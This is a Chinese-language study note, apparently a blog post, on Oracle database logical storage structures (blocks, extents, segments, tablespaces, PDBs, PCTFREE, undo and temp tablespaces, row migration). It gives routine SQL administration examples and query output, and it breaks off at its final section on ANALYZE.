数据库\n\n刚才是从大说到小，现在按照从小到大的方向再将它们描述一遍。一系列连续的BLOCK组成了EXTENT,一个或多个EXTENT组成了SEGMENT,一个或多个SEGMENT组成了TABLESPACE,而一个或多个TABLESPACE组成了DATABASE(一个DATABASE想存在，至少需要有SYSTEM及UNDO表空间)。\n到这里还是十分的抽象，理解不了一点。比如之前执行的 update t set object_id=92 where object_id=29; 这里的t表对应的就是逻辑结构，而数据则是写入数据文件 datafile 里。面对表操作肯定比面对数据文件直观形象得多，这个表是就从数据文件里直观抽象出来的逻辑结构。\n前面说到 Oracle 的逻辑结构从大到小分为表空间、段、区、数据库块这4部分。上面建的表是和段(SEGMENT)直接对应。但是表并不是只对应一个段，有数据段和索引段。此外，如果表有分区，每个分区又都独立成段。\n段(SEGMENT)是由区(EXTENT)组成的，而区又是由一系列数据块(BLOCK)组成的。那么为什么要存在区呢？块是数据库的最小单位，为什么不直接由块组成段呢？\nOracle的这个区(EXTENT)的设计是为了避免过度扩展。因为块的尺寸太小了，如果以这个块的尺寸为单位进行扩展，那么拓展会过于频繁，从而影响性能。\n块虽然说BLOCK是Oracle的最小逻辑数据单位，但是所有数据在文件系统层面最小物理存储单位是字节，操作系统也有一个类似Oracle的块容量的参数(block size),但是Oracle总是访问整个Oracle BLOCK,而不是按照操作系统的block size来访问的。一般情况下大多数操作系统OS的块容量为512字节大小或其整数倍，而数据库块一般默认设置为8KB,除此之外也有系统将其设置为2KB、4KB、16KB、32KB、64KB等其他大小。但是数据库的BLOCK一般要设置为操作系统OS块容量的整数倍，这样可以减少IO操作。\n这个很好理解，和操作系统内存管理的分页有些类似。比如IO的大小设置为512字节(0.5KB),本来如果DB的BLOCK设置为1KB正好是其2倍。但是设置为0.8KB,这时由于操作系统的单个块大小为0.5KB,只有2个操作系统块才可容纳下，于是就动用了2个OS块去容纳，相当于占用了1KB大小的OS空间，浪费了0.2KB。\nOracle的数据库块并不是简单地往里插数据，插满了装不下了就插入另一个数据块这么简单，而是额外提供了一定的管理功能。数据库的组成分为数据块头（包括标准内容和可变内容）(common and variable header)、表目录区(tabledirectory)、行目录区(row directory)、可用空间区(free space)、行数据区(row data)这5个部分，如下图：\n\n\n数据块头(header)中包含了此数据块的概要信息，例如块地址(block address)及此数据块所属的段(segment)的类型（比如到底是表还是索引）。\n表目录存放了块中行数据所在的表的信息。\n行目录存放了插入的行的地址。\n可用空间区就是块中的空余空间.这个空余的多少由Oracle的PCTFREE参数设置，如果是1O,表示该块将会空余10%左右的空间。此外如果是表或者索引块，该区域还会存储事务条目，大致有23字节左右开销。至于为什么要有空余，后面会有解释。\n行数据区域就是存储具体的行的信息或者索引的信息，这部分占用了数据块绝大部分的空间。\n\n这里数据块头(data block header)、表目录区(table directory)、行目录区(row directory)被统称为管理开销(overhead),其中有些开销的容量是固定的，而有些开销的总容量是可变的。数据块中固定及可变管理开销的容量平均在84到107字节(byte)之间。\n段一些连续的数据块(data block)组合在一起，就形成了区(EXTENT)。EXTENT是Oracle数据库分配空间的最小单位，请注意分配这两个字眼。\n当某用户创建一张表T时，实质就是建了一个数据段segment T。在Oracle数据库中，只要segment创建成功，数据库就一定为其分配了包含若干数据块(data block)的初始数据扩展(initial extent),即便此时表中还没数据，但是这些初始数据扩展中的数据块已经为即将插入的数据做好准备了。接下来T表（也就是SEGMENT T)中开始插入数据，很快初始数据扩展中的数据块都装满了，而且又有新数据插入需要空间，此时Oracle会自动为这个段分配一个新增数据扩展(incremental extent),这个新增数据扩展是一个段中已有数据扩展之后分配的后续数据扩展，容量大于或等于之前的数据扩展。\n每个段(segment)的定义中都包含了数据扩展(extent)的存储参数(storage parameter)。存储参数适用于各种类型的段。这个参数控制着Oracle如何为段分配可用空间。例如，用户可以在CREATE TABLE语句中使用STORAGE子句设定存储参数，决定创建表时为其数据段(data segment)分配多少初始空间，或限定一个表最多可以包含多少数据扩展。如果用户没有为表设定存储参数，那么表在创建时使用所在表空间(tablespace)的默认存储参数。\n在一个本地管理的表空间中（注：还有一种数据字典管理的表空间，因为是一种要被淘汰的技术，这里就不提及了)，其中所分配的数据扩展(extent)的容量既可以是用户设定的固定值，也可以是由系统自动决定的可变值，取决于用户创建tablespace时用UNIFORM指令（固定大小）还是AUTOALLOCATE指令（由系统管理）。对于固定容量(UNIFORM)的数据扩展，用户可以为数据扩展设定容量（比如100MB、1GB等随你设定)或使用默认大小(1MB)。用户必须确保每个数据扩展的容量至少能包含5个数据库块(database block)。本地管理(locally managed)的临时表空间(temporary tablespace)在分配数据扩展时只能使用此种方式。对于由系统管理(AUTOALLOCATE)的数据扩展，就无从插手干预了，Oracle或许一个区申请20M,下一个区忽然申请100M,Oracle在运行过程中自行决定新增数据扩展的最佳容量，我们无从得知规律。不过还是有一个下限的，即区的扩展过程中其最小容量不能低于64KB,假如数据块容量大于等于16KB,这个下限将从64KB转变为1MB。\n表空间分类在 Oracle 数据库中，表空间（Tablespace）是组织和管理数据文件的逻辑容器。表空间是数据库中最大的逻辑存储单元，所有的数据库对象（如表、索引、回滚段等）都存储在表空间中。Oracle 支持多种类型的表空间，每种类型有不同的用途和特点。\n系统表空间系统表空间是数据库中默认创建的表空间之一，用于存储数据库的数据字典和其他重要元数据。\n\n包含数据库的数据字典信息，如表、视图、存储过程等。\n包含数据库的控制信息。\n通常不应用于存储用户数据。\n\n临时表空间临时表空间用于存储临时数据，如排序操作、临时表等。\n\n数据是非持久的，会在会话结束或事务提交后自动清除。\n临时表空间中的数据文件称为临时文件（Temporary Files）。\n通常用于支持临时表和排序操作。\n\n回滚表空间回滚表空间用于存储事务回滚所需的信息。\n\n用于支持事务的回滚操作。\n通常包含一个或多个数据文件。\n\n逻辑结构初次体会上面都是概念性的东西，下面开始实操。\nBlock 块查询数据库的块(BLOCK)大小为8KB,这是Oracle的最小逻辑单位。\nSQL&gt; show parameters db_block_size;NAME                                 TYPE        VALUE------------------------------------ ----------- ------------------------------db_block_size                        integer     8192\n\n也可以通过观察表空间视图 dba_tablespaces 的 block_size 值获取。\nSQL&gt; select block_size from dba_tablespaces where tablespace_name=&#x27;SYSTEM&#x27;;BLOCK_SIZE----------      8192\n\nTablespace 表空间-- 创建普通数据表空间CREATE TABLESPACE &quot;test&quot;    DATAFILE &#x27;/opt/oracle/oradata/FREE/test.dbf&#x27;    SIZE 100M -- 数据文件的初始大小    AUTOEXTEND ON -- 允许数据文件自动扩展-- 创建临时表空间CREATE TEMPORARY TABLESPACE test_temp    TEMPFILE &#x27;/opt/oracle/oradata/FREE/test_temp.dbf&#x27;    SIZE 50M    AUTOEXTEND ON-- 创建回滚段表空间CREATE UNDO TABLESPACE test_undo    DATAFILE &#x27;/opt/oracle/oradata/FREE/test_undo.dbf&#x27;    SIZE 100M    AUTOEXTEND ON-- 系统表空间SELECT file_name,       tablespace_name,       autoextensible,       bytes / 1024 / 1024FROM DBA_DATA_FILESWHERE TABLESPACE_NAME LIKE &#x27;SYS%&#x27;order by substr(file_name, -12);\n\n系统表空间查询结果：\n\n\n\nFILE_NAME\nTABLESPACE_NAME\nAUTOEXTENSIBLE\nBYTES&#x2F;1024&#x2F;1024\n\n\n\n&#x2F;opt&#x2F;oracle&#x2F;oradata&#x2F;FREE&#x2F;sysaux01.dbf\nSYSAUX\nYES\n1450\n\n\n&#x2F;opt&#x2F;oracle&#x2F;oradata&#x2F;FREE&#x2F;system01.dbf\nSYSTEM\nYES\n1090\n\n\nSYSAUX 表空间用于存储数据库的辅助数据，如索引组织表（Index Organized Tables, IOTs）、LOB 数据、数据字典视图快照等。它是 Oracle 10g 及以后版本引入的表空间，用于减轻 SYSTEM 表空间的压力。\n\n系统表空间和用户表空间属于永久保留数据的表空间。\n\nUser 用户-- 创建用户drop user &quot;test&quot; cascade;create user &quot;test&quot;    identified by &quot;test_password&quot;    default tablespace &quot;test&quot;    temporary tablespace test_temp;-- 赋权grant dba to &quot;test&quot;;\n\n上述创建用户的命令会报错：ORA-65096: 公用用户或角色名称必须以前缀 C## 开头这是因为 Oracle Database 12c 引入了一项重要的新特性：多租户架构，其中包括容器数据库（CDB）和可插入数据库（PDB）。这项特性极大地改变了数据库管理的方式，提供了更好的资源隔离、简化了数据库部署和维护，并增强了安全性。在书中并未这部分，可能作者使用的版本较低。所以这部分是查资料所得。\n容器数据库（Container Database, CDB）是一个包含多个可插入数据库（Pluggable Databases, PDBs）的数据库。CDB 包括根容器（Root Container）和种子容器（Seed Container），以及一个或多个可插入数据库。\n\n根容器：CDB 的根容器包含全局数据库对象和管理信息。根容器通常不包含用户数据。\n种子容器：CDB 的种子容器是一个特殊的 PDB，用于创建新的 PDB 时作为模板。每个 CDB 都有一个种子容器，通常命名为 PDB$SEED。\n\n可插入数据库（Pluggable Database, PDB）是 CDB 中的独立数据库环境，可以像传统的独立数据库一样使用，但它们共享同一套物理文件和资源。每个 PDB 都有自己的表空间、用户、角色、对象等。\n\n独立性：每个 PDB 都是一个完整的数据库环境，拥有自己的表空间、用户、角色和数据。\n资源隔离：PDB 之间相互隔离，可以配置资源限制，以防止一个 PDB 影响其他 PDB 的性能。\n可移植性：PDB 可以轻松地在不同的 CDB 之间移动，甚至可以在不同的 Oracle 数据库版本之间移动。\n共享资源：尽管每个 PDB 都是独立的，但它们共享 CDB 的物理文件和资源，从而减少了管理开销和提高了资源利用率。\n\n使用 CDB 和 PDB 带来的好处\n\n简化管理：通过将多个数据库作为 PDB 放入单个 CDB 中，可以大大简化数据库的管理。例如，补丁更新、备份和恢复等操作只需要在 CDB 层级执行即可。\n资源隔离：PDB 之间的资源可以被隔离，从而确保每个 PDB 都有稳定的资源使用环境。\n安全性增强：每个 PDB 都可以有自己的安全策略，从而增强了整个系统的安全性。\n成本节省：多个 PDB 共享 CDB 的资源，可以减少硬件成本和许可证费用。\n\n下面是相关的 sql 语句。\n-- 查看当前容器show con_nameselect sys_context(&#x27;USERENV&#x27;,&#x27;CON_NAME&#x27;) conname from dual;-- 查看PDBselect con_id, dbid, name, open_mode from v$pdbs;-- 新建 PDB (PDB有多种创建方式，这里是通过PDB$SEED创建PDB。此外还有通过PDB创建PDB等多种方式，毕竟PDB是可插拔的，注定它的管理方式是多种多样的。)-- 其中 oracledb 是可插接式数据库名称，TEST_USER 是创建的该PDB的管理员用户，123456 是密码。file_name_convert 指定了文件名转换规则，用于将种子 PDB (PDB$SEED) 的数据文件路径转换为目标 PDB (oracledb) 的数据文件路径。create pluggable database oracledb admin user TEST_USER identified by 123456 file_name_convert = (&#x27;/opt/oracle/oradata/ORCLCDB/pdbseed&#x27;,&#x27;/opt/oracle/oradata/orclcdb/oracledb&#x27;);-- 创建完成后的 PDB 数据库还不能直接使用，因为此时他的状态是 MOUNTED。使用下面的sql更改其状态。alter pluggable database oracledb open;alter pluggable database all open;-- 切换容器alter session set container=PDB$SEED;alter session set container=oracledb;\n\n创建完成之后，就可以使用新的用户连接到数据库里。jdbc:oracle:thin:@//127.0.0.1:1521/oracledb\n这里简单叙述下 PDB 和 CDB 的概念，和基本的用户创建。下面回到书中，继续体会逻辑结构。\nEXTENT 区Oracle的最小逻辑单位是块(BLOCK),而最小的扩展单位是区(EXTENT).\n-- 创建表 如果没有指定表空间，则使用该用户默认的表空间drop table t purge;create table t (id int) tablespace default_dataspace;-- 查询数据字典获取extent相关信息select segment_name,       extent_id,       tablespace_name,       bytes/1024/1024,blocksfrom user_extentswhere segment_name=&#x27;T&#x27;;\n\n插入 2000000 条数据后，有39个区。\n\n\n\nSEGMENT_NAME\nEXTENT_ID\nTABLESPACE_NAME\nBYTES&#x2F;1024&#x2F;1024\nBLOCKS\n\n\n\nT\n0\nSYSTEM\n0.0625\n8\n\n\nT\n1\nSYSTEM\n0.0625\n8\n\n\nT\n2\nSYSTEM\n0.0625\n8\n\n\nT\n3\nSYSTEM\n0.0625\n8\n\n\nT\n4\nSYSTEM\n0.0625\n8\n\n\nT\n5\nSYSTEM\n0.0625\n8\n\n\nT\n6\nSYSTEM\n0.0625\n8\n\n\nT\n7\nSYSTEM\n0.0625\n8\n\n\nT\n8\nSYSTEM\n0.0625\n8\n\n\nT\n9\nSYSTEM\n0.0625\n8\n\n\nT\n10\nSYSTEM\n0.0625\n8\n\n\nT\n11\nSYSTEM\n0.0625\n8\n\n\nT\n12\nSYSTEM\n0.0625\n8\n\n\nT\n13\nSYSTEM\n0.0625\n8\n\n\nT\n14\nSYSTEM\n0.0625\n8\n\n\nT\n15\nSYSTEM\n0.0625\n8\n\n\nT\n16\nSYSTEM\n1\n128\n\n\nT\n17\nSYSTEM\n1\n128\n\n\nT\n18\nSYSTEM\n1\n128\n\n\nT\n19\nSYSTEM\n1\n128\n\n\nT\n20\nSYSTEM\n1\n128\n\n\nT\n21\nSYSTEM\n1\n128\n\n\nT\n22\nSYSTEM\n1\n128\n\n\nT\n23\nSYSTEM\n1\n128\n\n\nT\n24\nSYSTEM\n1\n128\n\n\nT\n25\nSYSTEM\n1\n128\n\n\nT\n26\nSYSTEM\n1\n128\n\n\nT\n27\nSYSTEM\n1\n128\n\n\nT\n28\nSYSTEM\n1\n128\n\n\nT\n29\nSYSTEM\n1\n128\n\n\nT\n30\nSYSTEM\n1\n128\n\n\nT\n31\nSYSTEM\n1\n128\n\n\nT\n32\nSYSTEM\n1\n128\n\n\nT\n33\nSYSTEM\n1\n128\n\n\nT\n34\nSYSTEM\n1\n128\n\n\nT\n35\nSYSTEM\n1\n128\n\n\nT\n36\nSYSTEM\n1\n128\n\n\nT\n37\nSYSTEM\n1\n128\n\n\nT\n38\nSYSTEM\n1\n128\n\n\nSEGMENT 段观察数据段\n-- 查询数据字典获取segment相关信息select segment_name,       segment_type,       tablespace_name,       blocks,       extents,bytes/1024/1024from user_segmentswhere segment_name =&#x27;T&#x27;;\n\n\n\n\nSEGMENT_NAME\nSEGMENT_TYPE\nTABLESPACE_NAME\nBLOCKS\nEXTENTS\nBYTES&#x2F;1024&#x2F;1024\n\n\n\nT\nTABLE\nSYSTEM\n3072\n39\n24\n\n\n2000000 条数据，占用了24M空间，用了39个区，3072个块。\n观察索引段\n-- 创建索引create index idx_id on t(id);-- 查询数据字典获取segment相关信息select segment_name,       segment_type,       tablespace_name,       blocks,       extents,       bytes/1024/1024from user_segmentswhere segment_name =&#x27;IDX_ID&#x27;;\n\n\n\n\nSEGMENT_NAME\nSEGMENT_TYPE\nTABLESPACE_NAME\nBLOCKS\nEXTENTS\nBYTES&#x2F;1024&#x2F;1024\n\n\n\nIDX_ID\nINDEX\nSYSTEM\n4608\n51\n36\n\n\n逻辑结构二次体会BLOCK的大小和调整一般来说，Oracle默认的数据库块大小就是8KB,是在创建数据库时决定的，所以如果想改变块的大小，就必须在建库时指定。Oracle9i以后的版本中，Oracle支持用户在新建用户表空间时指定块的大小，这意味着数据库有多个表空间，他们各自的BLOCK大小有可能各不相同。切记只是新建的用户表空间，原有的已经建好的表空间是不可以更改的，系统表空间更不可能更改或调整。\nSQL&gt; show parameters cache_sizeNAME                                 TYPE        VALUE------------------------------------ ----------- ------------------------------client_result_cache_size             big integer 0data_transfer_cache_size             big integer 0db_16k_cache_size                    big integer 0db_2k_cache_size                     big integer 0db_32k_cache_size                    big integer 0db_4k_cache_size                     big integer 0db_8k_cache_size                     big integer 0db_cache_size                        big integer 0db_flash_cache_size                  big integer 0db_keep_cache_size                   big integer 0db_recycle_cache_size                big integer 0\n\n上面的参数意味着可以设置2KB、4KB、8KB、16KB、32KB的块大小。如果将 db_16k_cache_size 设置为 1OOMB，就意味着SGA中的 DATA BUFFER 数据缓存区中将会有10OMB的大小让内存块可以以16KB的大小进行访问了，同时也意味着16KB大小的设置从此生效了。然后建表空间，切记加上 blocksize 16K 的关键字即可。这里就不演示了。\nPCTFREE 参数、调整和生效范围之前有说 BLOCK 块有一个FREE空间，是由PCTFREE参数决定的，设置这个参数来控制BLOCK保留一些空间。为什么要保留是之前留下的问题。下面举例子来解答：假如数据库中有某表T有900行记录，如果一个块最多可以装10行记录，最终需要90个块将T表记录装满。如果PCTFREE为10，表示会预留10%的空间，那就是每个块都只能装9行数据，最终需要100个块才可以把T表记录装满。这时做全表扫描的查询，查询T表的所有记录，如果PCTFREE设置为1O，将会遍历100个数据块。如果为0，将遍历90个数据块。这种情况下，当然是PCTFREE设置为0的效率更高。但是只有在只读数据库或者说只有插入删除很少更新的数据库环境中，才合适将PCTFREE设置为0。预留的空间是为了更新操作。\n有的表频繁更新，有的表几乎是只读的，从不更新。所以不同类型的表就应该设置不同的PCTFREE，表在数据库中就是SEGMENT，因此PCTFREE这个参数其实是可以只针对某个具体段的系列区包含的BLOCK生效。Oracle有一个默认的属性，就是PCTFREE&#x3D;1O，在整个数据库层面生效。但是具体到建T表时，可以指定PCTFREE为别的值，比如20，那这个T表或者说SEGMENT T的所有块的属性，就是PCTFREE为20。\nEXTENT 尺寸与调整区的大小是可以设置的，之前在区的逻辑结构中可以看到区的大小有时是0.0625MB(扩展8个块)，有时是1MB(128个块)，这是表空间区拓展大小设置的是自动拓展的缘故。如果想要自定义，可以在创建表空间时添加 uniform size 1OM 的关键字，表示扩展是统一尺寸，大小都是1OMB。\n逻辑结构三次体会以用和未用表空间情况查看表空间剩余情况\nSQL&gt; select tablespace_name,sum(bytes)/1024/1024 from dba_free_space group by tablespace_name;TABLESPACE_NAME                SUM(BYTES)/1024/1024------------------------------ --------------------SYSTEM                                       2.4375SYSAUX                                      28.3125UNDOTBS1                                    92.3125\n\n查看表空间总体空间情况\nSQL&gt; select tablespace_name,sum(bytes)/1024/1024 from dba_data_files group by tablespace_name;TABLESPACE_NAME                SUM(BYTES)/1024/1024------------------------------ --------------------SYSAUX                                          430SYSTEM                                          340UNDOTBS1                                        100\n\n表空间大小和自动拓展表空间没有开启自动拓展（AUTOEXTENSIBLE &#x3D; NO）或者开启了自动拓展但存储空间不够了，此时会报错：ORA-01654: 索引 XXX 无法通过 128 (在表空间 xxx 中) 扩展\n磁盘还有存储空间，但没有开启自动拓展导致表空间不足。这时手动添加数据文件可以解决：ALTER TABLESPACE TBS_UB ADD DATAFILE &#39;/opt/oracle/oradata/FREE/db02.dbf&#39;SIZE 100M;或者开启自动拓展，让oracle自己拓展：alter database datafile &#39;/opt/oracle/oradata/FREE/db02.dbf&#39;autoextend on;\n磁盘不足导致表空间不足的话，可以考虑删除数据（数据是宝贵的，不建议删）或者添加硬件。drop tablespace TBS_UB including contents and datafiles; 其中 including contents and datafiles 表示要删除表空间的数据和对应的数据文件，如果表空间有数据，不增加 including contents 将无法删除成功。\n回滚表空间的新建与切换Oracle数据库建好后，UNDO表空间和TEMP表空间必然是建好了。但是实际情况是，回滚段和表空间都可以新建，并且用户都可以指定新建的空间。\n查看数据库当前在用回滚段，数据库当前的回滚表空间名为UNDOTBS1:\nSQL&gt; show parameters undoNAME                                 TYPE        VALUE------------------------------------ ----------- ------------------------------temp_undo_enabled                    boolean     FALSEundo_management                      string      AUTOundo_retention                       integer     900undo_tablespace                      string      UNDOTBS1\n\n\n其中 undo_management 的取值为 AUTO 表示是系统自动管理表空间而非手动管理。\n\n查看当前数据库有几个回滚段\nSQL&gt; select tablespace_name,contents,status from dba_tablespaces where contents=&#x27;UNDO&#x27;;TABLESPACE_NAME                CONTENTS              STATUS------------------------------ --------------------- ---------UNDOTBS1                       UNDO                  ONLINE\n\n查看数据库回滚段的大小\nSQL&gt; select tablespace_name,sum(bytes)/1024/1024 from dba_data_files where tablespace_name = &#x27;UNDOTBS1&#x27; group by tablespace_name;TABLESPACE_NAME                SUM(BYTES)/1024/1024------------------------------ --------------------UNDOTBS1                                        100\n\n切换回滚段的方法 alter system set undo_tablespace=undotbs2 scope=both; \n\n当前使用中的回滚段是无法被删除的回滚表空间是真的可以新建多个，并且自由切换的，但是数据库当前使用的回滚表空间却只能有一个（注：RAC数据库会有多个）\n\n临时表空间的新建和切换回滚表空间的特点是，数据库中可以建立多个，但是目前的在用表空间却只能有一个。而临时表空间在数据库中也可以建多个，却可以被同时使用。\n查看临时表空间大小\nSQL&gt; select tablespace_name,sum(bytes)/1024/1024 from dba_temp_files group by tablespace_name;TABLESPACE_NAME                SUM(BYTES)/1024/1024------------------------------ --------------------TEMP                                             20\n\n查看用户默认表空间和临时表空间\nSQL&gt; select DEFAULT_TABLESPACE,TEMPORARY_TABLESPACE,username from dba_users where username=&#x27;TEST_USER&#x27;;DEFAULT_TABLESPACE             TEMPORARY_TABLESPACE           USERNAME------------------------------ ------------------------------ --------------------------------------------------------------------------------------------------------------------------------SYSTEM                         TEMP                           TEST_USER\n\nalter user TEST_USER temporary tablespace TEMP02; 指定用户切换临时表空间alter database default temporary tablespace TEMP02; 切换所有用户默认临时表空间\n回滚段建多个的目的是可以瘦身，原先的回滚段一直扩展导致空间浪费太多，新建出来的小一点，切换成功后删除原来旧的回滚表空间，磁盘空间就空余出来了。而临时表空间是为了避免竞争。Oracle可以为每个用户指定不同的临时表空间，每个临时表空间的数据文件都在磁盘的不同位置上，减少了IO竞争。oracle还可以为统一用户不同session设置不同的临时表空间，进一步减少竞争。\n实际上建临时表空间组很简单，只要新建一个临时表空间，然后加上 tablespace group tmp_group ,就默认建成了一个名为 tmp_group 的临时表空间组了。例如：create tablespace tmp_group01 datafile &#39;/opt/oracle/oradata/FREE/tmp_group01.dbf&#39; size 100M tablespace group tmp_group;create tablespace tmp_group02 datafile &#39;/opt/oracle/oradata/FREE/tmp_group02.dbf&#39; size 100M tablespace group tmp_group;create tablespace tmp_group03 datafile &#39;/opt/oracle/oradata/FREE/tmp_group03.dbf&#39; size 100M tablespace group tmp_group;\n查询临时表空间情况\nSQL&gt; select * from dba_tablespace_groups;GROUP_NAME             TABLESPACE_NAME---------------------- ------------------------------TMP_GROUP              TMP_GROUP01                  TMP_GROUP              TMP_GROUP02                  TMP_GROUP              TMP_GROUP03                  \n\n指定某表空间移动到临时表空间组 alter tablespace TMP_GROUP04 tablespace group TMP_GROUP;使用 alter user TEST_USER temporary tablespace TMP_GROUP; 将用户切换到临时表空间组后。\n虽然是同一用户登录的，但不同的SESSION都会自动分配到了不同的临时表空间。同时，临时表空间组也可以分配多个。\n临时表空间组可以往表空间组里不断新增临时表空间，让数据库在运行时自动从临时表空间组中选择各个临时表空间，不只是用户层面，而且是在SESSION层面进行IO均衡负载，极大地提升了数据库的性能。\nEND过度拓展与性能extent是Oracle数据库扩展的最小单位，而且大小是可以设置的。如果某表（或者说某段）记录增长特别快，就可以考虑把这个EXTENT的大小设置得大一点，比如initial extent和incremental extent都设置比较大，这样申请扩展的次数就会减少，性能可以提高。\n下面来做个实验：首先建两个表空间，TBS_UB_A_01、TBS_UB_B_01，然后分别在两个表空间上建表。\nSQL&gt; create tablespace TBS_UB_A datafile &#x27;/home/oracle/TBS_UB_A_01.DBF&#x27; size 10M autoextend on uniform size 64k;Tablespace created.Elapsed: 00:00:00.59SQL&gt; create tablespace TBS_UB_B datafile &#x27;/home/oracle/TBS_UB_B_01.DBF&#x27; size 2G;Tablespace created.Elapsed: 00:00:07.87SQL&gt; CREATE TABLE t_a (id int)tablespace TBS_UB_A;Table created.Elapsed: 00:00:00.37SQL&gt; CREATE TABLE t_b (id int)tablespace TBS_UB_B;Table created.Elapsed: 00:00:00.01\n\n上面创建表空间 TBS_UB_A 大小设置的为10M，想要模拟表空间不足，在大量拓展时的性能如何。书上设置的大小为1M。这里可能由于版本原因，设置1M会报错：ORA-03214: The specified file size is smaller than the minimum blocks 784.表示尝试创建的数据文件的大小小于 Oracle 数据库要求的最小大小。因为 Oracle 数据库需要一定的空间来存储元数据和其他管理信息，即使数据文件为空。接下来开始做试验，插入200万数据。分别插入两张表，观察耗时和拓展次数。\nSQL&gt; insert into t_a select rownum from dual connect by level&lt;=2000000;2000000 rows created.Elapsed: 00:00:01.47SQL&gt; insert into t_b select rownum from dual connect by level&lt;=2000000;2000000 rows created.Elapsed: 00:00:01.64SQL&gt; select count(*)from user_extents where segment_name=&#x27;T_A&#x27;;  COUNT(*)----------       386Elapsed: 00:00:00.13SQL&gt; select count(*)from user_extents where segment_name=&#x27;T_B&#x27;;  COUNT(*)----------        40Elapsed: 00:00:00.13\n\n这里耗时差不多，但是拓展次数明显表空间小的更多。这里与书上的结果不一致，可能是因为后续的oracle版本对这方面做了优化。不过不可否认的是，拓展的次数少了，少做事也是书中第一章的核心。\nPCTFREE 与性能PCTFREE 参数在 Oracle 数据库中用于控制数据块中可用空间的比例，以便在插入或更新数据时保留一定的空闲空间。根据数据库对表更新的频繁程度，对表的 PCTFREE 做设置，避免和链式行产生行迁移，影响性能。\n在 Oracle 数据库中，行迁移和链式行是与数据块管理和行更新相关的概念。当行更新导致其大小发生变化时，可能会发生这两种情况。\n行迁移 发生在更新行时，更新后的行大小超过了原来所在的块中的可用空间。当这种情况发生时，Oracle 数据库会尝试将更新后的行迁移到同一个数据块内的其他空闲空间中。如果在同一个数据块内找不到足够的空闲空间，Oracle 会尝试将行迁移到其他数据块中。\n\n性能影响：行迁移可能导致数据块之间的数据碎片化，增加后续操作的 I&#x2F;O 成本。\n空间浪费：如果预留的空间不足以容纳更新后的行，可能会导致空间浪费。\n\n链式行 发生在行迁移后仍然无法在一个数据块中容纳更新后的行的情况下。在这种情况下，Oracle 会将行分割成多个片段，并将这些片段分布在不同的数据块中。每个片段都会包含指向下一个片段的指针，形成一个链表。\n\n性能影响：链式行会增加 I&#x2F;O 成本，因为每次读取或更新行时都需要访问多个数据块。\n空间浪费：链式行可能导致更多的空间浪费，因为每个片段都需要额外的空间来存储指向下一个片段的指针。\n\n优化的方法是：\n\n使用 PCTFREE 参数：通过设置 PCTFREE 参数，可以在数据块中预留一定比例的空间，以便在行更新时有足够的空间来容纳更新后的行。\n调整数据块大小：根据数据的特点调整数据块大小，以减少行迁移和链式行的发生。\n合理设计表结构：合理设计表结构，例如使用变长列和定长列的组合，可以减少行大小的变化，从而降低行迁移和链式行的可能性。\n定期分析和优化表：定期执行 ANALYZE 和 OPTIMIZE 操作可以帮助减少数据碎片化。见文末。\n\n这里不进行实验了，简单描述下。（没有测试表，暂时先这样吧）当表的字段类型由 varchar2(20) 改为 varchar2(2000)。这时，往表中填满这些字段，便会产生大量的行迁移。此时，进行查询便会产生大量的逻辑读，导致性能的降低。因为行迁移会导致数据在数据块间分布不均，造成数据碎片化。行链接也是一样，更新后的行无法在一个数据块中完全容纳，Oracle 会将行分割成多个片段，并将这些片段分布在不同的数据块中。每个片段都会包含指向下一个片段的指针，形成一个链表。这都意味着在后续的查询或操作中，Oracle 需要从多个数据块中读取数据，增加了逻辑读的次数。消除行迁移的一个简单方法就是数据重建。CREATE TABLE TABLE_NAME_BK AS select * from TABLE_NAME;\n行迁移与优化如何发现表存在行迁移？\n-- 首先建chained_rows相关表，这是必需的步骤@?/rdbms/admin/utlchain.sql-- 以下命令针对T表做分析，将产生行迁移的记录插入到chained_rows表中analyze table t list chained rows into chained_rows;-- 通过分析结果可以看到具体哪条记录产生了行迁移select count(1) from chained_rows where table_name = &#x27;T&#x27;;\n\n通过这个方法可以了解到哪些表产生了严重的行迁移，可以适当做出改进。比如重建新表消除行迁移，然后对PCTFREE做适当的调整等。下面可以对当前用户所有表做分析。\nselect &#x27;analyze table &#x27; || table_name || &#x27; list chained rows into chained_rows;&#x27; from user_tables;select * from chained_rows;\n\nOracle 官网 CHAINED_ROWS\n块的大小与应用BLOCK除了谈这个PCTFREE属性外，还有本身设置多大的问题。有的系统设置8KB甚至4KB、2KB，而有的系统设置16KB甚至32KB大。BLOCK是Oracle最小的单位。如果Oracle是单块读，则一次读取一个块，就是一个IO，当然如果是一次读取多个块，那还是算一个IO，这称之为多块读。这里有一个问题，如果块越大，装的行记录就越多，那所需要的块就越少，换句话说，读取记录产生的IO就越少。那块越大越好吗？显然不可能这么极端。\n实际情况是，对于数据仓库OLAP的数据库应用，一般倾向于BLOCK尽量大，而OLTP应用，一般倾向于BLOCK尽量不要太大。OLAP和OLTP的差别在于，前者一般查询返回大量的数据，而后者查询返回极少量数据。前者一般用户不多，并发不大，后者一般用户很多，并发很大。因此OLAP系统最多的查询方式应该是全表扫描，而OLTP系统最多的方式应该是索引读。\n其中的原理主要是较大的块可以减少IO，同时提高缓存的命中率，可以提升全表扫描的性能。而较小的块每次IO操作涉及的数据量较小，可以降低锁的竞争，提高并发性能，同时较小的数据块也有助于提高索引的性能，因为索引通常涉及到随机访问，较小的数据块可以更快地定位到所需数据。\n-- 准备两个表空间，块大小分别为8K和16Kdrop tablespace TBS_UB_8K INCLUDING CONTENTS AND DATAFILES;create tablespace TBS_UB_8K    blocksize 8K    datafile &#x27;/home/oracle/TBS_UB_8K_01.DBF&#x27;size 1G;drop tablespace TBS_UB_16K INCLUDING CONTENTS AND DATAFILES;create tablespace TBS_UB_16K    blocksize 16K    datafile &#x27;/home/oracle/TBS_UB_16k_01.DBF&#x27;size 1G;-- 在两个表空间上分别创建300万数据量的大表，并创建索引。drop table t_16k purge;create table t_16k tablespace tbs_ljb_16k as select * from dba_objects;insert into t_16k select * from t_16k;-- ...省略插入数据update t_16k set object_id = rownum;create index idx_object_id on t_16k (object_id);commit;-- ...t_8k 的创建过程同上，略-- 然后可以比较两个表在全表扫和索引的读下的性能了。-- 记得查看执行计划。select count(*) from t_8k;select count(*) from t_16k;select * from t_8k where object_id = 29;select * from t_16k where object_id = 29;\n\n书上的预期情况是 全表扫描的性能是大块有优势的，索引读的性能是不分上下的（可能块大小差别没那么大）。最后这里没有实践，不知道Oracle后续版本有没有优化。\nANALYZE 和 OPTIMIZE在 Oracle 数据库中，定期执行 ANALYZE 和 OPTIMIZE 操作可以帮助减少数据碎片化，并保持统计信息的准确性，从而提高查询性能。可以参考的文章 Oracle表的分析统计这部分好像很复杂啊\nANALYZE 